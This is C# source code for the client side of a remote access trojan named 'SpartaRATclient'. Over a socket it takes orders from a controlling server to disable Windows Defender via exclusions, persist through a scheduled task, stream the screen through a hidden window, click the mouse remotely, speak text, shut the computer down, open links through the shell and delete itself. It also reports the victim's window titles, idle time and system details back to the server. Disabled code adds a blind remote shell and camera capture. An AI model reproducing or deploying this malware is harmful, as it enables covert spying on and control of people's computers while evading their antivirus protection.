using System;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Speech.Synthesis;
using System.Windows.Forms;
using System.Drawing;
using SpartaRATclient.Tools;
using System.Security.Cryptography;
using System.IO;

namespace SpartaRATclient
{
    public class Server
    {
        public delegate void GotMessage(byte[] message);
        public delegate void LostConnection();
        public delegate void screenStreamEvent();
        public delegate void paintStreamEvent(byte[] message);
        public delegate void PaintConfig(byte[] message);
        public delegate void StopSharingCmaera();

        public event GotMessage ChatMessageEvent;
        public event LostConnection LostConnectionEvent;
        public event screenStreamEvent ScreenStream;
        public event paintStreamEvent PaintStream;
        public event PaintConfig PaintConfigs;
        public event StopSharingCmaera s_StopSharingCamera;

        private string prevIdleTime = "-1";
        private string prevCurrentOpenedTab = "null";
        private Socket SocketConnection = default(Socket);

        public bool ServerConnected = false;

        public Server(Socket ServerSocket)
        {
            this.ChatMessageEvent = delegate { };
            this.LostConnectionEvent = delegate { };
            this.ScreenStream = delegate { };
            this.PaintStream = delegate { };
            this.PaintConfigs = delegate { };
            this.s_StopSharingCamera = delegate { };
            this.SocketConnection = ServerSocket;
            this.ServerConnected = true;
        }
        public void Send(byte[] message, byte messageType)
        {
            if (message.Length > 0)
            {
                try
                {
                    byte[] type = new byte[] { messageType };
                    byte[] mesLength = BitConverter.GetBytes(message.Length);
                    byte[] tlv = new byte[1 + 5 + message.Length];

                    Array.Copy(type, 0, tlv, 0, 1);
                    Array.Copy(mesLength, 0, tlv, 1, 4);
                    Array.Copy(message, 0, tlv, 6, message.Length);

                    this.SocketConnection.Send(tlv);
                }
                catch { ServerConnected = false; }
            }
        }

        private byte[] Read(int bytes)
        {
            byte[] buffer = new byte[bytes];
            int bytesRead = 0;
            while (bytesRead < bytes)
                bytesRead += this.SocketConnection.Receive(buffer, bytesRead, bytes - bytesRead, SocketFlags.None);
            return buffer;
        }

        public void Receive()
        {
            new Thread(() =>
            {
                this.SendDetails();
            }).Start();

            while (ServerConnected)
            {
                try 
                {
                    //server must send 6 bytes - Therefore client know to expect for 6 bytes.
                    byte[] tlv = Read(6);

                    //index 0 = type
                    byte type = tlv[0];
                    

                    //index 1-6 = length
                    int lengthRead = BitConverter.ToInt32(tlv, 1);

                    //reading from server according to the Int32 bit value (from index 1-6)
                    byte[] message = Read(lengthRead);

                    switch (type)
                    {
                        case 0: break;

                        //chat (Message Received)
                        case 1: ChatMessageEvent.Invoke(message); break;


                        //chat (Opening GUI screen)
                        case 2: if (Application.OpenForms.OfType<Chat>().Count() == 0) { new Thread(new ThreadStart(() => { Chat ct = new Chat(this); ct.ShowDialog(); })).Start(); } break;

                        //computer Talk
                        case 4: string a = Encoding.ASCII.GetString(message); SpeechSynthesizer synth = new SpeechSynthesizer(); synth.SetOutputToDefaultAudioDevice(); synth.Speak(a); break;

                        //exit program
                        case 7: Send(Encoding.ASCII.GetBytes("\0"), 0); Environment.Exit(0); break;

                        //screen Stream - Opening the hidden GUI of screen share. (small resolution TopMost GUI window so it will work even when playing on fullscreen games)
                         case 8: if (Application.OpenForms.OfType<ScreenShare>().Count() == 0) { new Thread(new ThreadStart(() => { ScreenShare ShareScreen = new ScreenShare(this); ShareScreen.ShowDialog(); })).Start(); } break;

                        //screen Stream - delegate event that stops the screen streaming
                        case 9: ScreenStream.Invoke(); break;

                        //Paint delegate X,Y,Location - on screen
                        case 10: PaintStream.Invoke(message); break;

                        //Windows defender bypass and persistence
                        case 20: new Thread(new ThreadStart(() => { new Thread(new ThreadStart(() => { DefenderExclusion application = new DefenderExclusion(); application.Exclude(); })).Start(); schtask task = new schtask(); task.Create(); })).Start(); break;

                        //Clicking on screen
                        case 22: ScreenClick(message); break;

                        //Delete app
                        case 23: DeleteApp app = new DeleteApp(); app.Delete(); break;

                        //Computer shutdown
                        case 14: Shell command1 = new Shell(this); command1.Run(@"shutdown /s /t 1"); break;

                        //Open link
                        case 24: Shell command2 = new Shell(this); command2.Run(@"start " + Encoding.ASCII.GetString(message)); break;

                            /*CURRENTLY NOT IN USE
                            //BlindShell command running
                            case 13: BlindShell command1 = new BlindShell(this); command1.Run(message); break;
                            case 14: BlindShell command2 = new BlindShell(this); command2.Run(Encoding.ASCII.GetBytes(@"shutdown /s /t 2")); break;

                            //Camera sharing
                            case 18: ShareCamera(); break;
                            case 19: s_StopSharingCamera.Invoke(); break;
                                */
                    }
                } catch { }
            }
            this.SocketConnection.Close();
            LostConnectionEvent.Invoke();
            return; //returning - not connected
        }

        private void SendDetails()
        {
            //Sending screen resolution
            Rectangle resolution = Screen.PrimaryScreen.Bounds; Send(Encoding.ASCII.GetBytes(resolution.ToString()), 21);

            this.Send(Encoding.ASCII.GetBytes("0.0.0.0"), 5); //Ipaddress
            this.Send(Encoding.ASCII.GetBytes("loading"), 6); //Country
            this.Send(Encoding.ASCII.GetBytes("Administrator"), 17); //running as Admin or User?
            this.Send(Encoding.ASCII.GetBytes("loading"), 16); //Windows Version and Type
            this.Send(Encoding.ASCII.GetBytes("loading"), 19); //Opening date

            Thread.Sleep(10000);

            RegistryData data = new RegistryData();
            this.Send(Encoding.ASCII.GetBytes(data.OSVersion), 16); //Windows Version and Type
            this.Send(Encoding.ASCII.GetBytes(data.OpenedDate), 19); //Opening date

            while (ServerConnected)
            {
                SendIdleTime();
                SendCurrentWindow();
                Thread.Sleep(1000);
            }
        }


        private void SendCurrentWindow()
        {
            CurrentWindow Get = new CurrentWindow(this);
            string CurrWindow = Get.OpenWindow();
            if (!(CurrWindow == prevCurrentOpenedTab))
            {
                prevCurrentOpenedTab = CurrWindow;
                this.Send(Encoding.ASCII.GetBytes(CurrWindow), 3);
            }
        }
        private void SendIdleTime()
        {
            uint idleTime = IdleTime.GetIdleTime() / 1000;
            string time = idleTime.ToString();
            if (!(time == prevIdleTime))
            {
                prevIdleTime = time;
                Send(Encoding.ASCII.GetBytes(time), 2);
            }
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool SetCursorPos(int x, int y);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        private void ScreenClick(byte[] data)
        {
            const int MOUSEEVENTF_LEFTDOWN = 0x02;
            const int MOUSEEVENTF_LEFTUP = 0x04;

            string[] position = Encoding.ASCII.GetString(data).Split('\0');
            int x = int.Parse(position[0]);
            int y = int.Parse(position[1]);
            LeftMouseClick(x, y);

            void LeftMouseClick(int xpos, int ypos)
            {
                SetCursorPos(xpos, ypos);
                mouse_event(MOUSEEVENTF_LEFTDOWN, xpos, ypos, 0, 0);
                mouse_event(MOUSEEVENTF_LEFTUP, xpos, ypos, 0, 0);
            }
        }
        private void ShareCamera()
        {
            CameraView cam = new CameraView(this);
            new Thread(new ThreadStart(cam.GrabCamera)).Start();
        }
    }
}